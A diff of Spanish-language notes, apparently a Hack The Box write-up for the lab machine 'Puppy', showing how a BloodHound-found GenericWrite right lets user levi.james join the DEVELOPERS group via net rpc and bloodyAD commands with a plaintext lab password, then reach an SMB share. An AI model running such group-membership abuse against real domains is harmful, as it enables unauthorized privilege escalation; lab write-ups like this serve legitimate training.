@@ -116,11 +116,12 @@ Una vez dentro de la web importaremos el `.zip`
 ```
 
 Para buscar a que grupo pertenecemos, en el buscador de **bloodHound** el usuario que nos facilitaron al principio `levis.james` le haremos clic derecho y `add to owned`
-Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar atributos en otro grupo del que es miembro en este caso del grupo `DEVELOPERS@PUPPY.HTB`, permitiéndonos asignar al usuario dado dentro de otro grupo .
-Para ver la explotacion de `GenericWrite` le hacemos click y en Linux Abuse, nos indica como a
+Y en *Outbound Object Control* vemos que el usuario es miembro de `HR@PUPPY.HTB` que tiene capacidad de modificar atributos en otro grupo del que es miembro en este caso del grupo `DEVELOPERS@PUPPY.HTB`, permitiéndonos asignar al usuario dado dentro de otro grupo.
 
+Para ver la explotación de `GenericWrite` le hacemos clic y en Linux Abuse, nos indica como abusar de este privilegio añadiéndolo a **DEVELOPERS**:
+`net rpc group addmem "DEVELOPERS" "levi.james" -U "puppy.htp"/"levi.james"%'KingofAkron2025!' -S $IP`
 
-Sabiendo que tenemos esos "privilegios" añadimos el usuario al grupo **DEVELOPERS**
+También podemos añadir el usuario al grupo **DEVELOPERS** con la herramioenta [[BLOODYAD]]
 `bloodyAD --host $IP -d puppy.htb -u 'levi.james' -p 'KingofAkron2025!' add groupMember 'DEVELOPERS' 'levi.james'`
 
 Como nos hemos añadido al grupo **DEVELOPERS** volvemos a acceder al **SMB** y tendremos acceso a la carpeta compartida **DEV**
